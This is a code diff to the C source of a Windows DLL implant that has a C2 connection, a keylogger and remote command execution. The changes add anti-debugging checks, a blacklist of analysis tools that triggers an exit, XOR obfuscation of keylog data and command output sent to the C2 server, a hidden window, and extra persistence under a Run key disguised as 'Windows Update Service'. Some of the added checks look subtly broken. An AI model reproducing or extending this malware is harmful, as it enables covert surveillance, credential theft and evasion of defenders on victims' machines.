@@ -4,8 +4,18 @@
 #include <stdlib.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include <tlhelp32.h>
+#include <intrin.h>
 
 #pragma comment(lib, "ws2_32.lib")
+
+// Anti-debugging macros
+#define CHECK_DEBUGGER() if (IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), NULL)) ExitProcess(0)
+#define CHECK_BREAKPOINT() __try { __debugbreak(); } __except(EXCEPTION_EXECUTE_HANDLER) { ExitProcess(0); }
+#define CHECK_TIMING() LARGE_INTEGER start, end, freq; QueryPerformanceFrequency(&freq); QueryPerformanceCounter(&start); Sleep(100); QueryPerformanceCounter(&end); if ((end.QuadPart - start.QuadPart) < freq.QuadPart / 10) ExitProcess(0)
+
+// String obfuscation macro
+#define OBFUSCATE(str) XorString(str, sizeof(str)-1)
 
 // Configuration
 #define C2_SERVER "192.168.1.100"
@@ -27,6 +37,65 @@ BOOL ConnectToC2();
 void DisconnectFromC2();
 void ExecuteCommand(const char* command);
 void InstallPersistence();
+void AntiDebugChecks();
+BOOL IsBlacklistedProcess();
+char* XorString(char* str, size_t len);
+
+// XOR string obfuscation
+char* XorString(char* str, size_t len) {
+    char key = 0x42;
+    for (size_t i = 0; i < len; i++) {
+        str[i] ^= key;
+    }
+    return str;
+}
+
+// Anti-debugging checks
+void AntiDebugChecks() {
+    CHECK_DEBUGGER();
+    CHECK_BREAKPOINT();
+    CHECK_TIMING();
+    
+    // Check for blacklisted processes
+    if (IsBlacklistedProcess()) {
+        ExitProcess(0);
+    }
+    
+    // Hide window from taskbar
+    ShowWindow(hiddenWindow, SW_HIDE);
+    SetWindowLong(hiddenWindow, GWL_EXSTYLE, GetWindowLong(hiddenWindow, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
+}
+
+// Check for blacklisted processes
+BOOL IsBlacklistedProcess() {
+    const char* blacklisted[] = {
+        "procmon.exe", "procexp.exe", "windbg.exe", "ollydbg.exe",
+        "x32dbg.exe", "x64dbg.exe", "ida.exe", "ida64.exe",
+        "wireshark.exe", "tcpview.exe", "fiddler.exe", "autoruns.exe"
+    };
+    
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        return FALSE;
+    }
+    
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(PROCESSENTRY32);
+    
+    if (Process32First(hSnapshot, &pe)) {
+        do {
+            for (size_t i = 0; i < sizeof(blacklisted)/sizeof(blacklisted[0]); i++) {
+                if (_stricmp(pe.szExeFile, blacklisted[i]) == 0) {
+                    CloseHandle(hSnapshot);
+                    return TRUE;
+                }
+            }
+        } while (Process32Next(hSnapshot, &pe));
+    }
+    
+    CloseHandle(hSnapshot);
+    return FALSE;
+}
 
 // DllMain entry point
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
@@ -35,6 +104,9 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
             // Create hidden window for message loop
             hiddenWindow = CreateWindowA("STATIC", "", 0, 0, 0, 0, 0, NULL, NULL, hModule, NULL);
             if (hiddenWindow) {
+                // Anti-debugging checks
+                AntiDebugChecks();
+                
                 // Install persistence
                 InstallPersistence();
                 
@@ -44,8 +116,8 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
                 // Connect to C2 server
                 if (ConnectToC2()) {
                     // Send initial check-in
-                    const char* checkin = "[+] Sentinel DLL implanted successfully\n";
-                    send(c2Socket, checkin, strlen(checkin), 0);
+                    char checkin[] = "[+] Sentinel DLL implanted successfully\n";
+                    send(c2Socket, OBFUSCATE(checkin), strlen(checkin), 0);
                 }
             }
             break;
@@ -150,6 +222,8 @@ void SendKeylogData() {
                 fread(buffer, 1, fileSize, logFile);
                 buffer[fileSize] = 0;
                 
+                // XOR encrypt data before sending
+                XorString(buffer, fileSize);
                 send(c2Socket, buffer, fileSize, 0);
                 free(buffer);
             }
@@ -206,6 +280,8 @@ void ExecuteCommand(const char* command) {
     if (pipe) {
         while (fgets(output, sizeof(output), pipe) != NULL) {
             if (c2Socket != INVALID_SOCKET) {
+                // XOR encrypt output before sending
+                XorString(output, strlen(output));
                 send(c2Socket, output, strlen(output), 0);
             }
         }
@@ -239,6 +315,18 @@ void InstallPersistence() {
         
         RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)dllPath, strlen(dllPath) + 1);
         RegSetValueEx(hKey, "ThreadingModel", 0, REG_SZ, (BYTE*)"Apartment", 9);
+        RegCloseKey(hKey);
+    }
+    
+    // Add to run keys for redundancy
+    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, 
+        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        
+        char dllPath[MAX_PATH];
+        GetModuleFileName(NULL, dllPath, sizeof(dllPath));
+        
+        RegSetValueEx(hKey, "Windows Update Service", 0, REG_SZ, (BYTE*)dllPath, strlen(dllPath) + 1);
         RegCloseKey(hKey);
     }
 }
